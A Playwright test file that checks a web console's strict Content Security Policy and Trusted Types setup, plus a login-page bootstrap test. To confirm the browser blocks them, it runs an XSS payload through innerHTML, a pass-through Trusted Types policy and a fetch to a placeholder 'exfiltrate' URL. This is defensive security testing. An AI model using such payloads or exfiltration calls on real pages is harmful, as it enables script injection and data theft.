import { expect, test } from "@playwright/test";

test("strict production CSP preserves sanitized HTML/markdown updates and rejects raw DOM sinks", async ({ page }, testInfo) => {
  await page.addInitScript(() => {
    (window as Window & { violations: string[] }).violations = [];
    document.addEventListener("securitypolicyviolation", event => {
      (window as Window & { violations: string[] }).violations.push(event.effectiveDirective);
    });
  });
  const errors: string[] = [];
  const consoleErrors: string[] = [];
  page.on("pageerror", error => errors.push(error.message));
  page.on("console", message => { if (message.type() === "error") consoleErrors.push(message.text()); });
  const response = await page.goto("/e2e/fixtures/console-security.html");
  expect(response?.headers()["content-security-policy"]).toContain("require-trusted-types-for 'script'");
  expect(response?.headers()["content-security-policy-report-only"]).toBeUndefined();
  await expect(page).toHaveTitle("Console security fixture");
  await expect(page.getByRole("heading", { name: "Console security fixture" })).toBeVisible();
  await expect(page.getByText("Preview ready", { exact: true })).toBeVisible();
  await expect(page.getByText("Safe text", { exact: true })).toBeVisible();
  await expect(page.locator(".katex")).toBeVisible();
  await expect(page.locator("vite-error-overlay")).toHaveCount(0);
  await page.getByRole("button", { name: "Update preview" }).click();
  await expect(page.getByText("Updated safely", { exact: true })).toBeVisible();
  expect(await page.evaluate(() => (window as Window & { __xss?: number }).__xss)).toBeUndefined();
  expect(errors).toEqual([]);
  expect(consoleErrors).toEqual([]);
  expect(await page.evaluate(() => (window as Window & { violations: string[] }).violations)).toEqual([]);
  await page.screenshot({ path: testInfo.outputPath("sanitized-preview.png"), fullPage: true });
  const denied = await page.evaluate(async () => {
    let rawSink = false, policy = false, connection = false;
    try { document.createElement("div").innerHTML = "<img src=x onerror=alert(1)>"; } catch { rawSink = true; }
    try { (window as unknown as { trustedTypes: { createPolicy: (name: string, rules: unknown) => unknown } }).trustedTypes.createPolicy("arbitrary-policy", { createHTML: (value: string) => value }); } catch { policy = true; }
    try { await fetch("https://unconfigured.invalid/exfiltrate"); } catch { connection = true; }
    return { rawSink, policy, connection };
  });
  expect(denied).toEqual({ rawSink: true, policy: true, connection: true });
});

test("main application bootstraps JSON before rendering a working login page", async ({ page }) => {
  const errors: string[] = [];
  page.on("pageerror", error => errors.push(error.message));
  await page.route("**/api/auth/session", route => route.fulfill({ status: 401, contentType: "application/json", body: '{"detail":"Unauthorized"}' }));
  await page.route("**/api/v1/telemetry/browser/config", route => route.fulfill({ contentType: "application/json", body: '{"enabled":false}' }));
  await page.goto("/login");
  await expect(page.locator('input[type="password"]')).toBeVisible();
  await page.locator('input[autocomplete="username"]').fill("fixture@example.test");
  await page.locator('input[type="password"]').fill("synthetic-password");
  expect(await page.evaluate(() => window.__AI_GATEWAY_RUNTIME_CONFIG__)).toEqual({});
  expect(await page.evaluate(() => localStorage.getItem("agent-gateway-auth"))).toBeNull();
  expect(errors).toEqual([]);
  await expect(page.locator("vite-error-overlay")).toHaveCount(0);
});
